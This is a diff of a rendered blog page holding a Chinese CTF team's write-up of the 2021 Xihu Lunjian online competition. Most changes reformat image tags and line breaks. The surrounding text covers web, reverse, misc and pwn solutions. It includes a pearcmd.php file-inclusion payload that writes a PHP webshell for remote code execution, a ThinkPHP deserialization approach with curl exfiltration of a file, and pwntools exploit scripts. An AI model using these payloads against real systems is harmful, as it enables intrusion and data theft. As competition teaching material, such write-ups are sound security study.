@@ -2,7 +2,7 @@
 
 <!DOCTYPE html>
 <html lang="en" itemscope itemtype="http://schema.org/WebPage">
-  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <head>
     
 
   <meta charset="utf-8" />
@@ -15,7 +15,8 @@
       <title>2021年西湖论剑线上赛 SU Write-up - su-team</title>
 
   <meta name="description" content="以下是我们 SU 本次 西湖论剑线上赛 的 writeup
-同时我们也在持续招人，只要你拥有一颗热爱 CTF 的心，都可以加入我们！欢迎发送个人简介至：suers_xctf@126.com或直接联系书鱼(QQ:381382770)">
+同时我们也在持续招人，只要你拥有一颗热爱 CTF 的心，都可以加入我们！欢迎发送个人简介至：suers_xctf@126.com
+或直接联系书鱼(QQ:381382770)">
   <meta name="author" content="SUer"/><script type="application/ld+json">
 {
     "@context": "http://schema.org",
@@ -64,9 +65,9 @@
     "name" : "SUer"
   },
   "headline": "2021年西湖论剑线上赛 SU Write-up",
-  "description" : "以下是我们 SU 本次 西湖论剑线上赛 的 writeup 同时我们也在持续招人，只要你拥有一颗热爱 CTF 的心，都可以加入我们！欢迎发送个人简介至：suers_xctf@126.com或直接联系书鱼(QQ:381382770)\n",
+  "description" : "以下是我们 SU 本次 西湖论剑线上赛 的 writeup 同时我们也在持续招人，只要你拥有一颗热爱 CTF 的心，都可以加入我们！欢迎发送个人简介至：suers_xctf@126.com 或直接联系书鱼(QQ:381382770)\n",
   "inLanguage" : "en",
-  "wordCount":  3866 ,
+  "wordCount":  3867 ,
   "datePublished" : "2021-11-21T17:53:27\u002b08:00",
   "dateModified" : "2021-11-21T17:53:27\u002b08:00",
   "image" : "http:\/\/localhost:1313\/img\/SU.jpg",
@@ -88,7 +89,8 @@
 
 <meta property="og:title" content="2021年西湖论剑线上赛 SU Write-up" />
 <meta property="og:description" content="以下是我们 SU 本次 西湖论剑线上赛 的 writeup
-同时我们也在持续招人，只要你拥有一颗热爱 CTF 的心，都可以加入我们！欢迎发送个人简介至：suers_xctf@126.com或直接联系书鱼(QQ:381382770)">
+同时我们也在持续招人，只要你拥有一颗热爱 CTF 的心，都可以加入我们！欢迎发送个人简介至：suers_xctf@126.com
+或直接联系书鱼(QQ:381382770)">
 <meta property="og:image" content="http://localhost:1313/img/SU.jpg" />
 <meta property="og:url" content="http://localhost:1313/post/xhlj-2021-su-wu/" />
 <meta property="og:type" content="website" />
@@ -96,7 +98,8 @@
 
   <meta name="twitter:title" content="2021年西湖论剑线上赛 SU Write-up" />
   <meta name="twitter:description" content="以下是我们 SU 本次 西湖论剑线上赛 的 writeup
-同时我们也在持续招人，只要你拥有一颗热爱 CTF 的心，都可以加入我们！欢迎发送个人简介至：suers_xctf@126.com或直接联系书鱼(QQ:381382770)">
+同时我们也在持续招人，只要你拥有一颗热爱 CTF 的心，都可以加入我们！欢迎发送个人简介至：suers_xctf@126.com
+或直接联系书鱼(QQ:381382770)">
   <meta name="twitter:image" content="http://localhost:1313/img/SU.jpg" />
   <meta name="twitter:card" content="summary_large_image" />
   <link href='http://localhost:1313/img/SU.jpg' rel='icon' type='image/x-icon'/>
@@ -319,7 +322,7 @@
     &nbsp;|&nbsp;<i class="fas fa-clock"></i>&nbsp;19&nbsp;min
   
   
-    &nbsp;|&nbsp;<i class="fas fa-book"></i>&nbsp;3866&nbsp;words
+    &nbsp;|&nbsp;<i class="fas fa-book"></i>&nbsp;3867&nbsp;words
   
   
     
@@ -404,19 +407,35 @@
         <section class="article-shell">
           <article role="main" class="blog-post">
             <p>以下是我们 SU 本次 西湖论剑线上赛 的 writeup
-同时我们也在持续招人，只要你拥有一颗热爱 CTF 的心，都可以加入我们！欢迎发送个人简介至：<a href="mailto:suers_xctf@126.com">suers_xctf@126.com</a>或直接联系书鱼(QQ:381382770)</p>
+同时我们也在持续招人，只要你拥有一颗热爱 CTF 的心，都可以加入我们！欢迎发送个人简介至：<a href="mailto:suers_xctf@126.com">suers_xctf@126.com</a>
+或直接联系书鱼(QQ:381382770)</p>
 <h2 id="web">Web</h2>
 <h3 id="web1"><strong>web1</strong></h3>
 <p>是个信呼的web应用，老洞都打不了，没有给写入的权限，</p>
 <p>所以我们需要去找新的利用点</p>
-<p><img src="/img/2021-11-20-XHLJ/20211121175536083.jpg" alt="img"></p>
+<p><img
+  src="/post/xhlj-2021-su-wu/20211121175536083.jpg"
+  alt="img"
+  loading="lazy"
+>
+</p>
 <p>这个地方把他生成的方法类中的displayfile传入到了下面的mpathname中</p>
-<p><img src="/img/2021-11-20-XHLJ/20211121175536029.jpg" alt="img"></p>
+<p><img
+  src="/post/xhlj-2021-su-wu/20211121175536029.jpg"
+  alt="img"
+  loading="lazy"
+>
+</p>
 <p>于是在这个位置就可能会造成</p>
 <p>文件包含</p>
 <p>然后全局搜索一下那个displayfile</p>
 <p>发现在webmain/index/indexAction.php中的getshtmlAction方法里传入一个surl，然后经过拼接传入到了displayfile中，而surl是我们可控的，所以这里确实存在一个文件包含</p>
-<p><img src="/img/2021-11-20-XHLJ/20211121175536532.jpg" alt="img"></p>
+<p><img
+  src="/post/xhlj-2021-su-wu/20211121175536532.jpg"
+  alt="img"
+  loading="lazy"
+>
+</p>
 <p>这里因为拼接了后缀为php，而我们没有上传文件的权限，所以只能包含已经有的文件。然后就想到前阵子p神提出的pearcmd.php的利用。</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">/?+</span><span class="nx">config</span><span class="o">-</span><span class="nx">create</span><span class="o">+/&amp;</span><span class="nx">m</span><span class="o">=</span><span class="nx">index</span><span class="o">&amp;</span><span class="nx">a</span><span class="o">=</span><span class="nx">getshtml</span><span class="o">&amp;</span><span class="nx">surl</span><span class="o">=</span><span class="nx">Li4vLi4vLi4vLi4vdXNyL2xvY2FsL2xpYi9waHAvcGVhcmNtZA</span><span class="o">==&amp;/&lt;?=</span><span class="nx">system</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span><span class="cp">?&gt;</span><span class="err">+/tmp/a.php
 </span></span></span></code></pre></div><p>然后再去包含生成的a.php就可以rce</p>
@@ -434,7 +453,8 @@
 <h3 id="tp">TP</h3>
 <p>先file结合过滤器取读取控制器代码，这里有个直接反序列点；利用tp的路由规则直接来打；2333///public绕一下parse_url就可；</p>
 <p>我之前发过两个thinkphp的另反序列化链；</p>
-<p><a href="https://www.freebuf.com/articles/web/263458.html">https://www.freebuf.com/articles/web/263458.html</a></p>
+<p><a href="https://www.freebuf.com/articles/web/263458.html">https://www.freebuf.com/articles/web/263458.html</a>
+</p>
 <p>用其中第一个链直接打，然后curl将文件发送过来就可；</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
 </span></span><span class="line"><span class="cl">
@@ -538,11 +558,21 @@
 <p>进入西湖论剑网络安全大赛微信公众号，发送语音说出“西湖论剑2021，我来了。”即可获得本题 flag：）</p>
 <h3 id="yusa的小秘密">yusa的小秘密</h3>
 <p>Ycrcb隐写提取得到图片，放stegsolve中得到flag</p>
-<p><img src="/img/2021-11-20-XHLJ/20211121175536081.jpg" alt="img"></p>
+<p><img
+  src="/post/xhlj-2021-su-wu/20211121175536081.jpg"
+  alt="img"
+  loading="lazy"
+>
+</p>
 <h2 id="reverse">Reverse</h2>
 <h3 id="ror">ROR</h3>
 <p><code>main</code> 函数很清晰</p>
-<p><img src="/img/2021-11-20-XHLJ/20211121175536406.jpg" alt="img"></p>
+<p><img
+  src="/post/xhlj-2021-su-wu/20211121175536406.jpg"
+  alt="img"
+  loading="lazy"
+>
+</p>
 <p>Z3 一把梭</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c++" data-lang="c++"><span class="line"><span class="cl"><span class="n">import</span> <span class="n">z3</span>
 </span></span><span class="line"><span class="cl">
@@ -659,26 +689,47 @@
 </span></span><span class="line"><span class="cl"><span class="n">print</span><span class="p">(</span><span class="err">&#39;&#39;</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="n">flag</span><span class="p">))</span>
 </span></span></code></pre></div><h3 id="tacticalarmed">TacticalArmed</h3>
 <ol>
-<li><code>TLSCallback0</code> 里头起了个线程</li>
+<li>
+<p><code>TLSCallback0</code> 里头起了个线程</p>
+</li>
+<li>
+<p>线程填充 key</p>
+</li>
 </ol>
-<p><img src="/img/2021-11-20-XHLJ/(null)" alt="img"></p>
-<ol>
-<li>线程填充 key</li>
-</ol>
-<p><img src="/img/2021-11-20-XHLJ/20211121175536443.jpg" alt="img"></p>
+<p><img
+  src="/post/xhlj-2021-su-wu/20211121175536443.jpg"
+  alt="img"
+  loading="lazy"
+>
+</p>
 <ol>
 <li><code>initterm</code> 里面有反调试</li>
 </ol>
-<p><img src="/img/2021-11-20-XHLJ/20211121175536448.jpg" alt="img"></p>
+<p><img
+  src="/post/xhlj-2021-su-wu/20211121175536448.jpg"
+  alt="img"
+  loading="lazy"
+>
+</p>
 <ol>
 <li>这个线程在跑起来之后 IDA 的调试功能就没法用了，所以 patch 掉函数指针</li>
 </ol>
-<p><img src="/img/2021-11-20-XHLJ/20211121175536255.jpg" alt="img"></p>
+<p><img
+  src="/post/xhlj-2021-su-wu/20211121175536255.jpg"
+  alt="img"
+  loading="lazy"
+>
+</p>
 <ol>
 <li>核心部分每次执行的其实都只是一条指令</li>
 <li>手动 dump 前面的指令，发现大量的 shr xor 等操作，猜测是 tea，然后发现 delta 变成了 -0x7E5A96D2，密钥是初始化时赋值的，外层循环也能发现轮数改为了 33，并且每次加密后 sum 并没有置为 0</li>
 </ol>
-<p><img src="/img/2021-11-20-XHLJ/20211121175536576.jpg" alt="img"></p>
+<p><img
+  src="/post/xhlj-2021-su-wu/20211121175536576.jpg"
+  alt="img"
+  loading="lazy"
+>
+</p>
 <p>exp</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c++" data-lang="c++"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdint.h&gt;</span><span class="cp">
 </span></span></span><span class="line"><span class="cl">
@@ -1624,10 +1675,20 @@
 </span></span></code></pre></div><p>一共就是几个case分支，可以看到case0是输入，case2是输出错误。</p>
 <p>case4就是for(int i = 0; i &lt; 44; i++)</p>
 <p>case5是最后比较，即看有多少个输入是正确的，当为44时则输出correct。</p>
-<p><img src="/img/2021-11-20-XHLJ/20211121175536714.jpg" alt="img"></p>
+<p><img
+  src="/post/xhlj-2021-su-wu/20211121175536714.jpg"
+  alt="img"
+  loading="lazy"
+>
+</p>
 <p>case6是加密函数，case7就是对单字节加密结果比较了。</p>
 <p>密文在case7的分组来的，如第一组密文在如下箭头的地方：</p>
-<p><img src="/img/2021-11-20-XHLJ/20211121175536165.jpg" alt="img"></p>
+<p><img
+  src="/post/xhlj-2021-su-wu/20211121175536165.jpg"
+  alt="img"
+  loading="lazy"
+>
+</p>
 <p>这里还有一点要说的就是程序的<strong>sub_5585B8E481D0</strong>函数是把数据转化为二进制，但是1用3代替，0用2代替的。</p>
 <p>然后这里加密操作，猜测的是异或，因为输入数据在经过case6是变化过的。然后从测试的数据输入与输出得到异或值：0x9c</p>
 <p>如我输入的字符7，经过转化后变为了22332333，然后22332333变为了32323233，即0x37变为了0xAB，那么从这可推出：0x37^0xab = 0x9c</p>
@@ -1643,14 +1704,39 @@
 <blockquote>
 <p>你是真的粉丝还是虚假的粉丝？</p>
 </blockquote>
-<p><img src="/img/2021-11-20-XHLJ/20211121175536171.jpg" alt="img"></p>
-<p><img src="/img/2021-11-20-XHLJ/20211121175536245.jpg" alt="img"></p>
+<p><img
+  src="/post/xhlj-2021-su-wu/20211121175536171.jpg"
+  alt="img"
+  loading="lazy"
+>
+</p>
+<p><img
+  src="/post/xhlj-2021-su-wu/20211121175536245.jpg"
+  alt="img"
+  loading="lazy"
+>
+</p>
 <p>ASCII-faded 1999.txt</p>
-<p><img src="/img/2021-11-20-XHLJ/20211121175536493.jpg" alt="img"></p>
+<p><img
+  src="/post/xhlj-2021-su-wu/20211121175536493.jpg"
+  alt="img"
+  loading="lazy"
+>
+</p>
 <p>key1 和 key2 可以从上面得到（当然也可以逆向出）</p>
 <p>Final key 足够大就行了</p>
-<p><img src="https://txq2mmofcw.feishu.cn/space/api/box/stream/download/asynccode/?code=ZGJjMGUyYWQ2YWE3NDgyYWRhNjNjZDM1MGVkZjJiOGRfRTE2YVRhMVBDbThtbE1DdFoxWVNFdEhVZjlrV1kxaXpfVG9rZW46Ym94Y25jWWhDZ3JrUUxTbkZCOGJ5V0gyOGViXzE2Mzc0ODg1MzA6MTYzNzQ5MjEzMF9WNA" alt="img"></p>
-<p><img src="/img/2021-11-20-XHLJ/20211121175536234.jpg" alt="img"></p>
+<p><img
+  src="https://txq2mmofcw.feishu.cn/space/api/box/stream/download/asynccode/?code=ZGJjMGUyYWQ2YWE3NDgyYWRhNjNjZDM1MGVkZjJiOGRfRTE2YVRhMVBDbThtbE1DdFoxWVNFdEhVZjlrV1kxaXpfVG9rZW46Ym94Y25jWWhDZ3JrUUxTbkZCOGJ5V0gyOGViXzE2Mzc0ODg1MzA6MTYzNzQ5MjEzMF9WNA"
+  alt="img"
+  loading="lazy"
+>
+</p>
+<p><img
+  src="/post/xhlj-2021-su-wu/20211121175536234.jpg"
+  alt="img"
+  loading="lazy"
+>
+</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">S3Cre7_K3y = Al4N_wAlK3RX
 </span></span></code></pre></div><p>按照逆向的逻辑写脚本（其实等他命令行里播放完看这个文件也行</p>
 <p>Exp:</p>
@@ -1695,7 +1781,12 @@
 </span></span><span class="line"><span class="cl"><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;out.txt&#39;</span><span class="p">,</span> <span class="s1">&#39;wb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">fout</span><span class="p">:</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">    <span class="n">fout</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">r</span><span class="p">)</span>
-</span></span></code></pre></div><p><img src="/img/2021-11-20-XHLJ/20211121175536884.jpg" alt="img"></p>
+</span></span></code></pre></div><p><img
+  src="/post/xhlj-2021-su-wu/20211121175536884.jpg"
+  alt="img"
+  loading="lazy"
+>
+</p>
 <p>A_TrUe_AW_f4ns</p>
 <p>出了</p>
 <h3></h3>
@@ -1797,7 +1888,12 @@
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="n">sh</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
-</span></span></code></pre></div><p><img src="/img/2021-11-20-XHLJ/20211121175537028.jpg" alt="img"></p>
+</span></span></code></pre></div><p><img
+  src="/post/xhlj-2021-su-wu/20211121175537028.jpg"
+  alt="img"
+  loading="lazy"
+>
+</p>
 <h3 id="blind">Blind</h3>
 <p>用了alarm里的syscall，需要爆破一下1/16</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
@@ -2211,7 +2307,12 @@
 <p>port: 38700</p>
 <p>protocol: tcp</p>
 <p>nc连上 数独题 把汉字对应1-9编排 求出解</p>
-<p><img src="/img/2021-11-20-XHLJ/20211121175536861.jpg" alt="img"></p>
+<p><img
+  src="/post/xhlj-2021-su-wu/20211121175536861.jpg"
+  alt="img"
+  loading="lazy"
+>
+</p>
 <blockquote>
 <p>输入abcdefghi即可。</p>
 </blockquote>
